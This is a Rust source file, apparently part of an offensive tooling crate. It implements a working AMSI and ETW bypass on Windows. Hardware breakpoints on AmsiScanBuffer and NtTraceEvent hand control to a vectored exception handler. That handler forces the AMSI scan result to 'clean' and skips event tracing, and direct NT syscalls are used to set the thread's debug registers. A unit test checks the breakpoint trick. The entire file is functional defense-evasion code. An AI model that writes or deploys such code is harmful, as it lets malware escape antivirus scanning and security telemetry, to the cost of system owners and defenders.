//!
//!

use core::sync::atomic::{AtomicUsize, Ordering};

use crate::ffi::{
    wide, GetCurrentThreadId, GetModuleHandleW, GetProcAddress, RtlAddVectoredExceptionHandler,
};
use crate::invoke::{nt_close, nt_get_context_thread, nt_open_thread, nt_set_context_thread};
use crate::types::{ClientId, ObjectAttributes};
use crate::Context;

const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010; // CONTEXT_AMD64 | 0x10
const STATUS_SINGLE_STEP: i32 = 0x8000_0004u32 as i32;
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;

static AMSI_BP_ADDR: AtomicUsize = AtomicUsize::new(0);
static ETW_BP_ADDR: AtomicUsize = AtomicUsize::new(0);

static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);

#[repr(C)]
struct ExceptionRecord {
    code: i32,
    flags: u32,
    record: *mut ExceptionRecord,
    address: usize,
    number_parameters: u32,
    _pad: u32,
    information: [usize; 15],
}

#[repr(C)]
struct ExceptionPointers {
    record: *mut ExceptionRecord,
    context: *mut Context,
}

// ── VEH ────────────────────────────────────────────────────────────────

unsafe extern "system" fn veh_handler(info: *mut ExceptionPointers) -> i32 {
    let rec = (*info).record;
    if rec.is_null() || (*rec).code != STATUS_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let addr = (*rec).address;
    let ctx = &mut *(*info).context;

    let amsi = AMSI_BP_ADDR.load(Ordering::Relaxed);
    if amsi != 0 && addr == amsi {
        patch_amsi(ctx);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    let etw = ETW_BP_ADDR.load(Ordering::Relaxed);
    if etw != 0 && addr == etw {
        patch_etw(ctx);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}

unsafe fn patch_amsi(ctx: &mut Context) {
    let result_ptr = *((ctx.rsp + 0x30) as *const usize);
    if result_ptr != 0 {
        *(result_ptr as *mut u32) = 0; // AMSI_RESULT_CLEAN
    }
    ctx.rax = 0; // S_OK
    skip_to_ret(ctx);
}

unsafe fn patch_etw(ctx: &mut Context) {
    skip_to_ret(ctx);
}

unsafe fn skip_to_ret(ctx: &mut Context) {
    let ret = *(ctx.rsp as *const usize);
    ctx.rsp += 8;
    ctx.rip = ret as u64;
}

unsafe fn set_bp(position: usize, address: usize) -> bool {
    if position > 3 || address == 0 {
        return false;
    }

    let tid = GetCurrentThreadId();
    let client_id = ClientId {
        unique_process: std::process::id() as usize,
        unique_thread: tid as usize,
    };
    let mut thread = 0usize;
    let oa = ObjectAttributes::empty();
    let r_open = nt_open_thread(
        &mut thread,
        THREAD_ALL_ACCESS,
        &oa as *const ObjectAttributes as usize,
        &client_id as *const ClientId as usize,
    );
    if r_open != 0 {
        return false;
    }

    let mut ctx = Context::zeroed();
    ctx.context_flags = CONTEXT_DEBUG_REGISTERS;
    let got = nt_get_context_thread(thread, &mut ctx as *mut Context as usize);
    if got != 0 {
        nt_close(thread);
        return false;
    }

    match position {
        0 => ctx.dr0 = address as u64,
        1 => ctx.dr1 = address as u64,
        2 => ctx.dr2 = address as u64,
        3 => ctx.dr3 = address as u64,
        _ => {
            nt_close(thread);
            return false;
        }
    }
    ctx.dr7 &= !(3u64 << (16 + 4 * position));
    ctx.dr7 &= !(3u64 << (18 + 4 * position));
    ctx.dr7 |= 1u64 << (2 * position);

    let set = nt_set_context_thread(thread, &ctx as *const Context as usize);
    nt_close(thread);
    set == 0
}

///
pub unsafe fn install_amsi_etw_bypass() -> Result<(), &'static str> {
    if VEH_HANDLE.load(Ordering::Relaxed) != 0 {
        return Ok(());
    }

    let veh = RtlAddVectoredExceptionHandler(1, veh_handler as *const () as usize);
    if veh.is_null() {
        return Err("RtlAddVectoredExceptionHandler failed");
    }
    VEH_HANDLE.store(veh as usize, Ordering::Relaxed);

    let amsi = GetModuleHandleW(wide("amsi.dll").as_ptr());
    let amsi_addr = if amsi.is_null() {
        0
    } else {
        GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr()) as usize
    };
    let ntdll = GetModuleHandleW(wide("ntdll.dll").as_ptr());
    let etw_addr = if ntdll.is_null() {
        0
    } else {
        GetProcAddress(ntdll, b"NtTraceEvent\0".as_ptr()) as usize
    };

    if amsi_addr != 0 {
        AMSI_BP_ADDR.store(amsi_addr, Ordering::Relaxed);
        set_bp(0, amsi_addr);
    }
    if etw_addr != 0 {
        ETW_BP_ADDR.store(etw_addr, Ordering::Relaxed);
        set_bp(1, etw_addr);
    }

    Ok(())
}

#[cfg(all(test, windows))]
mod tests {
    use super::*;

    static TEST_ADDR: AtomicUsize = AtomicUsize::new(0);

    unsafe extern "system" fn test_veh(info: *mut ExceptionPointers) -> i32 {
        let rec = (*info).record;
        if !rec.is_null()
            && (*rec).code == STATUS_SINGLE_STEP
            && (*rec).address == TEST_ADDR.load(Ordering::Relaxed)
        {
            let ctx = &mut *(*info).context;
            ctx.rax = 0xDEAD_BEEF;
            skip_to_ret(ctx);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        EXCEPTION_CONTINUE_SEARCH
    }

    #[test]
    fn hardware_breakpoint_skips_function_body() {
        crate::init().expect("init libra-syscalls");

        unsafe {
            let veh = RtlAddVectoredExceptionHandler(1, test_veh as *const () as usize);
            assert!(!veh.is_null(), "VEH registration failed");

            let kernel32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
            let gpid = GetProcAddress(kernel32, b"GetCurrentProcessId\0".as_ptr()) as usize;
            assert!(gpid != 0, "GetCurrentProcessId must resolve");

            TEST_ADDR.store(gpid, Ordering::Relaxed);
            assert!(set_bp(0, gpid), "set_bp failed");

            let f: extern "system" fn() -> u32 = core::mem::transmute(gpid);
            let result = f();
            assert_eq!(
                result, 0xDEAD_BEEF,
                "VEH must skip function body and fake rax"
            );
        }
    }
}
